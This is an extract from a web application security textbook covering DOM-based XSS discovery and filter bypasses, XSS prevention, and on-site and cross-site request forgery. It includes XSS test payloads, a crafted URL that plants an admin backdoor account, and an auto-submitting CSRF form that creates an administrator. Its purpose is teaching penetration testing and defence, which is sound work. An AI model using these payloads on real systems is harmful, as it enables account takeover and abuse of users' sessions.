being requested is on the same domain, the client-side remote fi le inclusion 
attack succeeds.
Because this validation of the URL‚Äôs domain would have been unnecessary 
in older versions of HTML, this is one example where the changes introduced 
in HTML5 may themselves introduce exploitable conditions into existing applications that were previously secure.
Finding and Exploiting DOM-Based XSS Vulnerabilities
DOM-based XSS vulnerabilities cannot be identifi ed by submitting a unique string 
as each parameter and monitoring responses for the appearance of that string.
One basic method for identifying DOM-based XSS bugs is to manually walk 
through the application with your browser and modify each URL parameter to 
contain a standard test string, such as one of the following:
‚Äú<script>alert(1)</script>
‚Äú;alert(1)//
‚Äò-alert(1)-‚Äô
By actually displaying each returned page in your browser, you cause all 
client-side scripts to execute, referencing your modifi ed URL parameter where 
applicable. Any time a dialog box appears containing your cookies, you will 
have found a vulnerability (which may be due to DOM-based or other forms 
of XSS). This process could even be automated by a tool that implemented its 
own JavaScript interpreter.
However, this basic approach does not identify all DOM-based XSS bugs. 
As you have seen, the precise syntax required to inject valid JavaScript into an 
HTML document depends on the syntax that already appears before and after 
the point where the user-controllable string gets inserted. It may be necessary to 
terminate a single- or double-quoted string or to close specifi c tags. Sometimes 
new tags may be required, but sometimes not. Client-side application code may 
attempt to validate data retrieved from the DOM, and yet may still be vulnerable.
c12.indd 487 c12.indd 487 8/19/2011 12:12:34 PM 8/19/2011 12:12:34 PM
Stuttard c12.indd V2 - 08/10/2011 Page 488
488 Chapter 12 n Attacking Users: Cross-Site Scripting 
If a standard test string does not happen to result in valid syntax when it 
is processed and inserted, the embedded JavaScript does not execute, and no 
dialog appears, even though the application may be vulnerable to a properly 
crafted attack. Short of submitting every conceivable XSS attack string into every 
parameter, the basic approach inevitably misses a large number of vulnerabilities.
A more effective approach to identifying DOM-based XSS bugs is to review 
all client-side JavaScript for any use of DOM properties that may lead to a vulnerability. Various tools are available to help automate this process. One such 
effective tool is DOMTracer, available at the following URL:
www.blueinfy.com/tools.html
HACK STEPS
Using the results of your application mapping exercises from Chapter 4, 
review every piece of client-side JavaScript for the following APIs, which may 
be used to access DOM data that can be controlled via a crafted URL:
n document.location
n document.URL
n document.URLUnencoded
n document.referrer
n window.location
Be sure to include scripts that appear in static HTML pages as well as 
dynamically generated pages. DOM-based XSS bugs may exist in any location 
where client-side scripts are used, regardless of the type of page or whether 
you see parameters being submitted to the page.
In every instance where one of the preceding APIs is being used, closely 
review the code to identify what is being done with the user-controllable 
data, and whether crafted input could be used to cause execution of arbitrary 
JavaScript. In particular, review and test any instance where your data is being 
passed to any of the following APIs:
n document.write()
n document.writeln()
n document.body.innerHtml
n eval()
n window.execScript()
n window.setInterval()
n window.setTimeout()
c12.indd 488 c12.indd 488 8/19/2011 12:12:34 PM 8/19/2011 12:12:34 PM
Stuttard c12.indd V2 - 08/10/2011 Page 489
 Chapter 12 n Attacking Users: Cross-Site Scripting 489
TRY IT!
http://mdsec.net/error/18/
http://mdsec.net/error/22/
http://mdsec.net/error/28/
http://mdsec.net/error/31/
http://mdsec.net/error/37/
http://mdsec.net/error/41/
http://mdsec.net/error/49/
http://mdsec.net/error/53/
http://mdsec.net/error/56/
http://mdsec.net/error/61/
As with refl ected and stored XSS, the application may perform various fi ltering 
in an attempt to block attacks. Often, the fi ltering is applied on the client side, 
and you can review the validation code directly to understand how it works 
and to try to identify any bypasses. All the techniques already described for 
fi lters against refl ected XSS attacks may be relevant here.
TRY IT!
http://mdsec.net/error/92/
http://mdsec.net/error/95/
http://mdsec.net/error/107/
http://mdsec.net/error/109/
http://mdsec.net/error/118/
In some situations, you may fi nd that the server-side application implements 
fi lters designed to prevent DOM-based XSS attacks. Even though the vulnerable 
operation occurs on the client, and the server does not return the user-supplied 
data in its response, the URL is still submitted to the server. So the application 
may validate the data and fail to return the vulnerable client-side script when 
a malicious payload is detected.
If this defense is encountered, you should attempt each of the potential fi lter 
bypasses that were described previously for refl ected XSS vulnerabilities to test 
the robustness of the server‚Äôs validation. In addition to these attacks, several 
techniques unique to DOM-based XSS bugs may enable your attack payload to 
evade server-side validation.
When client-side scripts extract a parameter‚Äôs value from the URL, they rarely 
parse the query string properly into name/value pairs. Instead, they typically 
search the URL for the parameter name followed by the equals sign and then 
c12.indd 489 c12.indd 489 8/19/2011 12:12:34 PM 8/19/2011 12:12:34 PM
Stuttard c12.indd V2 - 08/10/2011 Page 490
490 Chapter 12 n Attacking Users: Cross-Site Scripting 
extract whatever comes next, up until the end of the URL. This behavior can 
be exploited in two ways:
n If the server‚Äôs validation logic is being applied on a per-parameter basis, 
rather than on the entire URL, the payload can be placed into an invented 
parameter appended after the vulnerable parameter. For example:
http://mdsec.net/error/76/Error.ashx?message=Sorry%2c+an+error+occurr
ed&foo=<script>alert(1)</script>
Here, the server ignores the invented parameter, and so it is not subject to 
any fi ltering. However, because the client-side script searches the query 
string for message= and extracts everything following this, it includes your 
payload in the string it processes.
n If the server‚Äôs validation logic is being applied to the entire URL, not 
just to the message parameter, it may still be possible to evade the fi lter 
by placing the payload to the right of the HTML fragment character (#):
http://mdsec.net/error/82/Error.ashx?message=Sorry%2c+an+error+
occurred#<script>alert(1)</script>
Here, the fragment string is still part of the URL. Therefore, it is stored 
in the DOM and will be processed by the vulnerable client-side script. 
However, because browsers do not submit the fragment portion of the 
URL to the server, the attack string is not even sent to the server and 
therefore cannot be blocked by any kind of server-side fi lter. Because the 
client-side script extracts everything after message=, the payload is still 
copied into the HTML page source.
TRY IT!
http://mdsec.net/error/76/
http://mdsec.net/error/82/
COMMON MYTH
‚ÄúWe check every user request for embedded script tags, so no XSS attacks are 
possible.‚Äù
Aside from the question of whether any fi lter bypasses are possible, you 
have now seen three reasons why this claim can be incorrect:
n In some XSS fl aws, the attacker-controllable data is inserted directly into 
an existing JavaScript context, so there is no need to use any script tags 
or other means of introducing script code. In other cases, you can inject 
an event handler containing JavaScript without using any script tags.
c12.indd 490 c12.indd 490 8/19/2011 12:12:34 PM 8/19/2011 12:12:34 PM
Stuttard c12.indd V2 - 08/10/2011 Page 491
 Chapter 12 n Attacking Users: Cross-Site Scripting 491
n If an application receives data via some out-of-band channel and renders 
this within its web interface, any stored XSS bugs can be exploited without submitting any malicious payload using HTTP.
n Attacks against DOM-based XSS may not involve submitting any malicious 
payload to the server. If the fragment technique is used, the payload 
remains on the client at all times.
Some applications employ a more sophisticated client-side script that performs 
stricter parsing of the query string. For example, it may search the URL for the 
parameter name followed by the equals sign but then extract what follows only 
until it reaches a relevant delimiter such as & or #. In this case, the two attacks 
described previously could be modifi ed as follows:
http://mdsec.net/error/79/Error.ashx?foomessage=<script>alert(1)</script
>&message=Sorry%2c+an+error+occurred
http://mdsec.net/error/79/Error.ashx#message=<script>alert(1)</script>
In both cases, the fi rst match for message= is followed immediately by the 
attack string, without any intervening delimiter, so the payload is processed 
and copied into the HTML page source.
TRY IT!
http://mdsec.net/error/79/
In some cases, you may fi nd that complex processing is performed on DOMbased data. Therefore, it is diffi cult to trace all the different paths taken by usercontrollable data, and all the manipulation being performed, solely through static 
review of the JavaScript source code. In this situation, it can be benefi cial to use 
a JavaScript debugger to monitor the script‚Äôs execution dynamically. The FireBug 
extension to the Firefox browser is a full-fl edged debugger for client-side code 
and content. It enables you to set breakpoints and watches on interesting code 
and data, making the task of understanding a complex script considerably easier.
COMMON MYTH
‚ÄúWe‚Äôre safe. Our web application scanner didn‚Äôt fi nd any XSS bugs.‚Äù
As you will see in Chapter 19, some web application scanners do a reasonable job of fi nding common fl aws, including XSS. However, it should be 
evident at this point that many XSS vulnerabilities are subtle to detect, and 
creating a working exploit can require extensive probing and experimentation. 
At the present time, no automated tools can reliably identify all these bugs.
c12.indd 491 c12.indd 491 8/19/2011 12:12:34 PM 8/19/2011 12:12:34 PM
Stuttard c12.indd V2 - 08/10/2011 Page 492
492 Chapter 12 n Attacking Users: Cross-Site Scripting 
Preventing XSS Attacks
Despite the various manifestations of XSS, and the different possibilities for 
exploitation, preventing the vulnerability itself is in fact conceptually straightforward. What makes it problematic in practice is the diffi culty of identifying every 
instance in which user-controllable data is handled in a potentially dangerous 
way. Any given page of an application may process and display dozens of items 
of user data. In addition to the core functionality, vulnerabilities may arise in 
error messages and other locations. It is hardly surprising, therefore, that XSS 
fl aws are so hugely prevalent, even in the most security-critical applications.
Different types of defense are applicable to refl ected and stored XSS on the one 
hand, and to DOM-based XSS on the other, because of their different root causes.
Preventing Refl ected and Stored XSS
The root cause of both refl ected and stored XSS is that user-controllable data is 
copied into application responses without adequate validation and sanitization. 
Because the data is being inserted into the raw source code of an HTML page, 
malicious data can interfere with that page, modifying not only its content but 
also its structure ‚Äî breaking out of quoted strings, opening and closing tags, 
injecting scripts, and so on.
To eliminate refl ected and stored XSS vulnerabilities, the fi rst step is to identify every instance within the application where user-controllable data is being 
copied into responses. This includes data that is copied from the immediate 
request and also any stored data that originated from any user at any prior time, 
including via out-of-band channels. To ensure that every instance is identifi ed, 
there is no real substitute for a close review of all application source code.
Having identifi ed all the operations that are potentially at risk of XSS and 
that need to be suitably defended, you should follow a threefold approach to 
prevent any actual vulnerabilities from arising:
n Validate input.
n Validate output.
n Eliminate dangerous insertion points.
One caveat to this approach arises where an application needs to let users 
author content in HTML format, such as a blogging application that allows 
HTML in comments. Some specifi c considerations relating to this situation are 
discussed after general defensive techniques have been described.
Validate Input
At the point where the application receives user-supplied data that may be copied into one of its responses at any future point, the application should perform 
c12.indd 492 c12.indd 492 8/19/2011 12:12:34 PM 8/19/2011 12:12:34 PM
Stuttard c12.indd V2 - 08/10/2011 Page 493
 Chapter 12 n Attacking Users: Cross-Site Scripting 493
context-dependent validation of this data, in as strict a manner as possible. 
Potential features to validate include the following:
n The data is not too long.
n The data contains only a certain permitted set of characters.
n The data matches a particular regular expression.
Different validation rules should be applied as restrictively as possible to 
names, e-mail addresses, account numbers, and so on, according to the type of 
data the application expects to receive in each fi eld.
Validate Output
At the point where the application copies into its responses any item of data that 
originated from some user or third party, this data should be HTML-encoded 
to sanitize potentially malicious characters. HTML encoding involves replacing 
literal characters with their corresponding HTML entities. This ensures that 
browsers will handle potentially malicious characters in a safe way, treating 
them as part of the content of the HTML document and not part of its structure. 
The HTML encodings of the primary problematic characters are as follows:
n ‚Äú ‚Äî &quot;
n ‚Äò ‚Äî &apos;
n & ‚Äî &amp;
n < ‚Äî &lt;
n > ‚Äî &gt;
In addition to these common encodings, any character can be HTML-encoded 
using its numeric ASCII character code, as follows:
n % ‚Äî &#37;
n * ‚Äî &#42;
It should be noted that when inserting user input into a tag attribute value, the 
browser HTML-decodes the value before processing it further. In this situation, 
the defense of simply HTML-encoding any normally problematic characters may 
be ineffective. Indeed, as we have seen, for some fi lters the attacker can bypass 
HTML-encoding characters in the payload herself. For example:
<img src=‚Äùjavascript&#58;alert(document.cookie)‚Äù>
<img src=‚Äùimage.gif‚Äù onload=‚Äùalert(&apos;xss&apos;)‚Äù>
As described in the following section, it is preferable to avoid inserting usercontrollable data into these locations. If this is considered unavoidable for some 
reason, great care needs to be taken to prevent any fi lter bypasses. For example, 
c12.indd 493 c12.indd 493 8/19/2011 12:12:35 PM 8/19/2011 12:12:35 PM
Stuttard c12.indd V2 - 08/10/2011 Page 494
494 Chapter 12 n Attacking Users: Cross-Site Scripting 
if user data is inserted into a quoted JavaScript string in an event handler, any 
quotation marks or backslashes in user input should be properly escaped with 
backslashes, and the HTML encoding should include the & and ; characters to 
prevent an attacker from performing his own HTML encoding.
ASP.NET applications can use the Server.HTMLEncode API to sanitize common malicious characters within a user-controllable string before this is copied 
into the server‚Äôs response. This API converts the characters ‚Äú&< and > into their 
corresponding HTML entities and also converts any ASCII character above 0x7f 
using the numeric form of encoding.
The Java platform has no equivalent built-in API; however, it is easy to construct your own equivalent method using just the numeric form of encoding. 
For example:
public static String HTMLEncode(String s)
{
 StringBuffer out = new StringBuffer();
 for (int i = 0; i < s.length(); i++)
 {
 char c = s.charAt(i);
 if(c > 0x7f || c==‚Äô‚Äù‚Äô || c==‚Äô&‚Äô || c==‚Äô<‚Äô || c==‚Äô>‚Äô)
 out.append(‚Äú&#‚Äù + (int) c + ‚Äú;‚Äù);
 else out.append(c);
 }
 return out.toString();
}
A common mistake developers make is to HTML-encode only the characters 
that immediately appear to be of use to an attacker in the specifi c context. For 
example, if an item is being inserted into a double-quoted string, the application might encode only the ‚Äú character. If the item is being inserted unquoted 
into a tag, it might encode only the > character. This approach considerably 
increases the risk of bypasses being found. As you have seen, an attacker can 
often exploit browsers‚Äô tolerance of invalid HTML and JavaScript to change 
context or inject code in unexpected ways. Furthermore, it is often possible to 
span an attack across multiple controllable fi elds, exploiting the different fi ltering 
being employed in each one. A far more robust approach is to always HTMLencode every character that may be of potential use to an attacker, regardless 
of the context where it is being inserted. To provide the highest possible level 
of assurance, developers may elect to HTML-encode every nonalphanumeric 
character, including whitespace. This approach normally imposes no measurable overhead on the application and presents a severe obstacle to any kind of 
fi lter bypass attack.
The reason for combining input validation and output sanitization is that this 
involves two layers of defenses, either one of which provides some protection 
if the other one fails. As you have seen, many fi lters that perform input and 
c12.indd 494 c12.indd 494 8/19/2011 12:12:35 PM 8/19/2011 12:12:35 PM
Stuttard c12.indd V2 - 08/10/2011 Page 495
 Chapter 12 n Attacking Users: Cross-Site Scripting 495
output validation are subject to bypasses. By employing both techniques, the 
application gains some additional assurance that an attacker will be defeated 
even if one of its two fi lters is found to be defective. Of the two defenses, the 
output validation is the most important and is mandatory. Performing strict 
input validation should be viewed as a secondary failover.
Of course, when devising the input and output validation logic itself, great 
care should be taken to avoid any vulnerabilities that lead to bypasses. In particular, fi ltering and encoding should be carried out after any relevant canonicalization, and the data should not be further canonicalized afterwards. The 
application should also ensure that the presence of any NULL bytes does not 
interfere with its validation.
Eliminate Dangerous Insertion Points
There are some locations within the application page where it is just too inherently dangerous to insert user-supplied input, and developers should look for 
an alternative means of implementing the desired functionality.
Inserting user-controllable data directly into existing script code should be 
avoided wherever possible. This applies to code within <script> tags, and also 
code within event handlers. When applications attempt to do this safely, it is 
frequently possible to bypass their defensive fi lters. And once an attacker has 
taken control of the context of the data he controls, he typically needs to perform minimal work to inject arbitrary script commands and therefore perform 
malicious actions.
Where a tag attribute may take a URL as its value, applications should generally avoid embedding user input, because various techniques may be used to 
introduce script code, including the use of scripting pseudo-protocols.
A further pitfall to avoid is situations where an attacker can manipulate the 
character set of the application‚Äôs response, either by injecting into a relevant 
directive or because the application uses a request parameter to specify the 
preferred character set. In this situation, input and output fi lters that are well 
designed in other respects may fail because the attacker‚Äôs input is encoded 
in an unusual form that the fi lters do not recognize as potentially malicious. 
Wherever possible, the application should explicitly specify an encoding type 
in its response headers, disallow any means of modifying this, and ensure that 
its XSS fi lters are compatible with it. For example:
Content-Type: text/html; charset=ISO-8859-1
Allowing Limited HTML
Some applications need to let users submit data in HTML format that will be 
inserted into application responses. For example, a blogging application may 
c12.indd 495 c12.indd 495 8/19/2011 12:12:35 PM 8/19/2011 12:12:35 PM
Stuttard c12.indd V2 - 08/10/2011 Page 496
496 Chapter 12 n Attacking Users: Cross-Site Scripting 
allow users to write comments using HTML, to apply formatting to their comments, embed links or images, and so on. In this situation, applying the preceding 
measures across the board will break the application. Users‚Äô HTML markup will 
itself be HTML-encoded in responses and therefore will be displayed on-screen 
as actual markup, rather than as the formatted content that is required.
For an application to support this functionality securely, it needs to be robust 
in allowing only a limited subset of HTML, which does not provide any means 
of introducing script code. This must involve a whitelist approach in which only 
specifi c tags and attributes are permitted. Doing this successfully is a nontrivial 
task because, as you have seen, there are numerous ways to use seemingly 
harmless tags to execute code.
For example, if the application allows the <b> and <i> tags and does not 
consider any attributes used with these tasks, the following attacks may be 
possible:
<b style=behavior:url(#default#time2) onbegin=alert(1)>
<i onclick=alert(1)>Click here</i>
Furthermore, if the application allows the apparently safe combination of the 
<a> tag with the href attribute, the following attack may work:
<a href=‚Äùdata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==‚Äù>Cl
ick here</a>
Various frameworks are available to validate user-supplied HTML markup 
to try to ensure that it does not contain any means of executing JavaScript, such 
as the OWASP AntiSamy project. It is recommended that developers who need 
to allow users to author limited HTML should either use a suitable mature 
framework directly or should closely examine one of them to understand the 
various challenges involved.
An alternative approach is to make use of a custom intermediate markup 
language. Users are permitted to use the limited syntax of the intermediate 
language, which the application then processes to generate the corresponding 
HTML markup.
Preventing DOM-Based XSS
The defenses described so far obviously do not apply directly to DOM-based 
XSS, because the vulnerability does not involve user-controlled data being 
copied into server responses.
Wherever possible, applications should avoid using client-side scripts to 
process DOM data and insert it into the page. Because the data being processed 
is outside of the server‚Äôs direct control, and in some cases even outside of its 
visibility, this behavior is inherently risky.
c12.indd 496 c12.indd 496 8/19/2011 12:12:35 PM 8/19/2011 12:12:35 PM
Stuttard c12.indd V2 - 08/10/2011 Page 497
 Chapter 12 n Attacking Users: Cross-Site Scripting 497
If it is considered unavoidable to use client-side scripts in this way, DOM-based 
XSS fl aws can be prevented through two types of defenses, corresponding to 
the input and output validation described for refl ected XSS.
Validate Input
In many situations, applications can perform rigorous validation on the data being 
processed. Indeed, this is one area where client-side validation can be more effective than server-side validation. In the vulnerable example described earlier, the 
attack can be prevented by validating that the data about to be inserted into the 
document contains only alphanumeric characters and whitespace. For example:
<script>
 var a = document.URL;
 a = a.substring(a.indexOf(‚Äúmessage=‚Äù) + 8, a.length);
 a = unescape(a);
 var regex=/^([A-Za-z0-9+\s])*$/;
 if (regex.test(a))
 document.write(a);
</script>
In addition to this client-side control, rigorous server-side validation of URL 
data can be employed as a defense-in-depth measure to detect requests that may 
contain malicious exploits for DOM-based XSS fl aws. In the same example just 
described, it would actually be possible for an application to prevent an attack 
by employing only server-side data validation by verifying the following:
n The query string contains a single parameter.
n The parameter‚Äôs name is message (case-sensitive check).
n The parameter‚Äôs value contains only alphanumeric content.
With these controls in place, it would still be necessary for the client-side 
script to parse the value of the message parameter properly, ensuring that any 
fragment portion of the URL was not included.
Validate Output
As with refl ected XSS fl aws, applications can perform HTML encoding of usercontrollable DOM data before it is inserted into the document. This enables 
all kinds of potentially dangerous characters and expressions to be displayed 
within the page in a safe way. HTML encoding can be implemented in clientside JavaScript with a function like the following:
function sanitize(str)
{
c12.indd 497 c12.indd 497 8/19/2011 12:12:36 PM 8/19/2011 12:12:36 PM
Stuttard c12.indd V2 - 08/10/2011 Page 498
498 Chapter 12 n Attacking Users: Cross-Site Scripting 
 var d = document.createElement(‚Äòdiv‚Äô);
 d.appendChild(document.createTextNode(str));
 return d.innerHTML;
}
Summary
This chapter has examined the various ways in which XSS vulnerabilities can 
arise and ways in which common fi lter-based defenses can be circumvented. 
Because XSS vulnerabilities are so prevalent, it is often straightforward to fi nd 
several bugs within an application that are easy to exploit. XSS becomes more 
interesting, from a research perspective at least, when various defenses are in 
place that force you to devise some highly crafted input, or leverage some littleknown feature of HTML, JavaScript, or VBScript, to deliver a working exploit.
The next chapter builds on this foundation and examines a wide variety of 
further ways in which defects in the server-side web application may leave its 
users exposed to malicious attacks.
Questions
Answers can be found at http://mdsec.net/wahh.
 1. What standard ‚Äúsignature‚Äù in an application‚Äôs behavior can be used to 
identify most instances of XSS vulnerabilities?
 2. You discover a refl ected XSS vulnerability within the unauthenticated 
area of an application‚Äôs functionality. State two different ways in which 
the vulnerability could be used to compromise an authenticated session 
within the application.
 3. You discover that the contents of a cookie parameter are copied without 
any fi lters or sanitization into the application‚Äôs response. Can this behavior be used to inject arbitrary JavaScript into the returned page? Can it be 
exploited to perform an XSS attack against another user?
 4. You discover stored XSS behavior within data that is only ever displayed 
back to yourself. Does this behavior have any security signifi cance?
 5. You are attacking a web mail application that handles fi le attachments 
and displays these in-browser. What common vulnerability should you 
immediately check for?
 6. How does the same-origin policy impinge upon the use of the Ajax technology XMLHttpRequest?
c12.indd 498 c12.indd 498 8/19/2011 12:12:36 PM 8/19/2011 12:12:36 PM
Stuttard c12.indd V2 - 08/10/2011 Page 499
 Chapter 12 n Attacking Users: Cross-Site Scripting 499
 7. Name three possible attack payloads for XSS exploits (that is, the malicious actions that you can perform within another user‚Äôs browser, not the 
methods by which you deliver the attacks).
 8. You have discovered a refl ected XSS vulnerability where you can inject 
arbitrary data into a single location within the HTML of the returned 
page. The data inserted is truncated to 50 bytes, but you want to inject a 
lengthy script. You prefer not to call out to a script on an external server. 
How can you work around the length limit?
 9. You discover a refl ected XSS fl aw in a request that must use the POST
method. What delivery mechanisms are feasible for performing an attack?
c12.indd 499 c12.indd 499 8/19/2011 12:12:36 PM 8/19/2011 12:12:36 PM
Stuttard c12.indd V2 - 08/10/2011 Page 500
c12.indd 500 c12.indd 500 8/19/2011 12:12:36 PM 8/19/2011 12:12:36 PM
Stuttard c13.indd V4 - 08/17/2011 Page 501
501
 C H A P T E R 
13
Attacking Users: Other 
Techniques
The preceding chapter examined the grandfather of attacks against other application users‚Äîcross-site scripting (XSS). This chapter describes a wide range of 
other attacks against users. Some of these have important similarities to XSS 
attacks. In many cases, the attacks are more complex or subtle than XSS attacks 
and can succeed in situations where plain XSS is not possible.
Attacks against other application users come in many forms and manifest a 
variety of subtleties and nuances that are frequently overlooked. They are also 
less well understood in general than the primary server-side attacks, with different fl aws being confl ated or neglected even by some seasoned penetration 
testers. We will describe all the different vulnerabilities that are commonly 
encountered and will spell out the steps you need to follow to identify and 
exploit each of these.
Inducing User Actions
The preceding chapter described how XSS attacks can be used to induce a 
user to unwittingly perform actions within the application. Where the victim 
user has administrative privileges, this technique can quickly lead to complete 
compromise of the application. This section examines some additional methods 
that can be used to induce actions by other users. These methods can be used 
even in applications that are secured against XSS.
c13.indd 501 c13.indd 501 8/19/2011 12:13:57 PM 8/19/2011 12:13:57 PM
Stuttard c13.indd V4 - 08/17/2011 Page 502
502 Chapter 13 n Attacking Users: Other Techniques
Request Forgery
This category of attack (also known as session riding) is closely related to session hijacking attacks, in which an attacker captures a user‚Äôs session token and 
therefore can use the application ‚Äúas‚Äù that user. With request forgery, however, 
the attacker need never actually know the victim‚Äôs session token. Rather, the 
attacker exploits the normal behavior of web browsers to hijack a user‚Äôs token, 
causing it to be used to make requests that the user does not intend to make.
Request forgery vulnerabilities come in two fl avors: on-site and cross-site.
On-Site Request Forgery
On-site request forgery (OSRF) is a familiar attack payload for exploiting stored 
XSS vulnerabilities. In the MySpace worm, described in the preceding chapter, 
a user named Samy placed a script in his profi le that caused any user viewing 
the profi le to perform various unwitting actions. What is often overlooked is 
that stored OSRF vulnerabilities can exist even in situations where XSS is not 
possible.
Consider a message board application that lets users submit items that are 
viewed by other users. Messages are submitted using a request like the following:
POST /submit.php
Host: wahh-app.com
Content-Length: 34
type=question&name=daf&message=foo
This request results in the following being added to the messages page:
<tr>
 <td><img src=‚Äù/images/question.gif‚Äù></td>
 <td>daf</td>
 <td>foo</td>
</tr>
In this situation, you would, of course, test for XSS fl aws. However, suppose 
that the application is properly HTML-encoding any ‚Äú < and > characters it inserts 
into the page. When you are satisfi ed that this defense cannot be bypassed in 
any way, you might move on to the next test.
But look again. You control part of the target of the <img> tag. Although you 
cannot break out of the quoted string, you can modify the URL to cause any user 
who views your message to make an arbitrary on-site GET request. For example, 
submitting the following value in the type parameter causes anyone viewing 
your message to make a request that attempts to add a new administrative user:
../admin/newUser.php?username=daf2&password=0wned&role=admin#
c13.indd 502 c13.indd 502 8/19/2011 12:13:57 PM 8/19/2011 12:13:57 PM
Stuttard c13.indd V4 - 08/17/2011 Page 503
 Chapter 13 n Attacking Users: Other Techniques 503
When an ordinary user is induced to issue your crafted request, it, of course, 
fails. But when an administrator views your message, your backdoor account 
gets created. You have performed a successful OSRF attack even though XSS 
was not possible. And, of course, the attack succeeds even if administrators take 
the precaution of disabling JavaScript.
In the preceding attack string, note the # character that effectively terminates 
the URL before the .gif suffi x. You could just as easily use & to incorporate the 
suffi x as a further request parameter.
TRY IT!
In this example, an OSRF exploit can be placed in the recent searches list, 
even though this is not vulnerable to XSS:
http://mdsec.net/search/77/
HACK STEPS
 1. In every location where data submitted by one user is displayed to other 
users but you cannot perform a stored XSS attack, review whether the 
application‚Äôs behavior leaves it vulnerable to OSRF.
 2. The vulnerability typically arises where user-supplied data is inserted into 
the target of a hyperlink or other URL within the returned page. Unless the 
application specifically blocks any characters you require (typically dots, 
slashes, and the delimiters used in the query string), it is almost certainly 
vulnerable.
 3. If you discover an OSRF vulnerability, look for a suitable request to target in your exploit, as described in the next section for cross-site request 
forgery.
OSRF vulnerabilities can be prevented by validating user input as strictly as 
possible before it is incorporated into responses. For example, in the specifi c 
case described, the application could verify that the type parameter has one 
of a specifi c range of values. If the application must accept other values that it 
cannot anticipate in advance, input containing any of the characters /.\?&
and = should be blocked.
Note that HTML-encoding these characters is not an effective defense against 
OSRF attacks, because browsers will decode the target URL string before it is 
requested.
Depending on the insertion point and the surrounding context, it may also 
be possible to prevent OSRF attacks using the same defenses described in the 
next section for cross-site request forgery attacks.
c13.indd 503 c13.indd 503 8/19/2011 12:13:57 PM 8/19/2011 12:13:57 PM
Stuttard c13.indd V4 - 08/17/2011 Page 504
504 Chapter 13 n Attacking Users: Other Techniques
Cross-Site Request Forgery
In cross-site request forgery (CSRF) attacks, the attacker creates an innocuouslooking website that causes the user‚Äôs browser to submit a request directly to 
the vulnerable application to perform some unintended action that is benefi cial 
to the attacker.
Recall that the same-origin policy does not prohibit one website from issuing 
requests to a different domain. It does, however, prevent the originating website 
from processing the responses to cross-domain requests. Hence, CSRF attacks 
normally are ‚Äúone-way‚Äù only. Multistage actions such as those involved in the 
Samy XSS worm, in which data is read from responses and incorporated into 
later requests, cannot be performed using a pure CSRF attack. (Some methods 
by which CSRF techniques can be extended to perform limited two-way attacks, 
and capture data cross-domain, are described later in this chapter.)
Consider an application in which administrators can create new user accounts 
using requests like the following:
POST /auth/390/NewUserStep2.ashx HTTP/1.1
Host: mdsec.net
Cookie: SessionId=8299BE6B260193DA076383A2385B07B9
Content-Type: application/x-www-form-urlencoded
Content-Length: 83
realname=daf&username=daf&userrole=admin&password=letmein1&
confirmpassword=letmein1
This request has three key features that make it vulnerable to CSRF attacks:
n The request performs a privileged action. In the example shown, the 
request creates a new user with administrative privileges.
n The application relies solely on HTTP cookies for tracking sessions. No 
session-related tokens are transmitted elsewhere within the request.
n The attacker can determine all the parameters required to perform the 
action. Aside from the session token in the cookie, no unpredictable values 
need to be included in the request.
Taken together, these features mean that an attacker can construct a web 
page that makes a cross-domain request to the vulnerable application containing everything needed to perform the privileged action. Here is an example of 
such an attack:
<html>
<body>
<form action=‚Äùhttps://mdsec.net/auth/390/NewUserStep2.ashx‚Äù 
method=‚ÄùPOST‚Äù>
c13.indd 504 c13.indd 504 8/19/2011 12:13:58 PM 8/19/2011 12:13:58 PM
Stuttard c13.indd V4 - 08/17/2011 Page 505
 Chapter 13 n Attacking Users: Other Techniques 505
<input type=‚Äùhidden‚Äù name=‚Äùrealname‚Äù value=‚Äùdaf‚Äù>
<input type=‚Äùhidden‚Äù name=‚Äùusername‚Äù value=‚Äùdaf‚Äù>
<input type=‚Äùhidden‚Äù name=‚Äùuserrole‚Äù value=‚Äùadmin‚Äù>
<input type=‚Äùhidden‚Äù name=‚Äùpassword‚Äù value=‚Äùletmein1‚Äù>
<input type=‚Äùhidden‚Äù name=‚Äùconfirmpassword‚Äù value=‚Äùletmein1‚Äù>
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
This attack places all the parameters to the request into hidden form fi elds 
and contains a script to automatically submit the form. When the user‚Äôs browser 
submits the form, it automatically adds the user‚Äôs cookies for the target domain, 
and the application processes the resulting request in the usual way. If an administrative user who is logged in to the vulnerable application visits the attacker‚Äôs 
web page containing this form, the request is processed within the administrator‚Äôs session, and the attacker‚Äôs account is created.
TRY IT!
http://mdsec.net/auth/390/
A real-world example of a CSRF fl aw was found in the eBay application by 
Dave Armstrong in 2004. It was possible to craft a URL that caused the requesting 
user to make an arbitrary bid on an auction item. A third-party website could 
cause visitors to request this URL, so that any eBay user who visited the website 
would place a bid. Furthermore, with a little work, it was possible to exploit the 
vulnerability in a stored OSRF attack within the eBay application itself. The 
application allowed users to place <img> tags within auction descriptions. To 
defend against attacks, the application validated that the tag‚Äôs target returned 
an actual image fi le. However, it was possible to place a link to an off-site server 
that returned a legitimate image when the auction item was created and subsequently replace this image with an HTTP redirect to the crafted CSRF URL. 
Thus, anyone who viewed the auction item would unwittingly place a bid on 
it. More details can be found in the original Bugtraq post:
http://archive.cert.uni-stuttgart.de/bugtraq/2005/04/msg00279.html
NOTE The defect in the application‚Äôs validation of off-site images is known 
as a ‚Äútime of check, time of use‚Äù (TOCTOU) fl aw. An item is validated at one 
time and used at another time, and an attacker can modify its value in the 
window between these times.
c13.indd 505 c13.indd 505 8/19/2011 12:13:58 PM 8/19/2011 12:13:58 PM
Stuttard c13.indd V4 - 08/17/2011 Page 506
506 Chapter 13 n Attacking Users: Other Techniques
Exploiting CSRF Flaws
CSRF vulnerabilities arise primarily in cases where applications rely solely on 
HTTP cookies for tracking sessions. Once an application has set a cookie in a 
user‚Äôs browser, the browser automatically submits that cookie to the application 
in every subsequent request. This is true regardless of whether the request originates from a link, form within the application itself, or from any other source 
such as an external website or a link clicked in an e-mail. If the application does 
not take precautions against an attacker‚Äôs ‚Äúriding‚Äù on its users‚Äô sessions in this 
way, it is vulnerable to CSRF.
HACK STEPS
 1. Review the key functionality within the application, as identified in your 
application mapping exercises (see Chapter 4).
 2. Find an application function that can be used to perform some sensitive action on behalf of an unwitting user, that relies solely on cookies 
for tracking user sessions, and that employs request parameters that an 
attacker can fully determine in advance‚Äîthat is, that do not contain any 
other tokens or unpredictable items.
 3. Create an HTML page that issues the desired request without any user 
interaction. For GET requests, you can place an <img> tag with the src
attribute set to the vulnerable URL. For POST requests, you can create a 
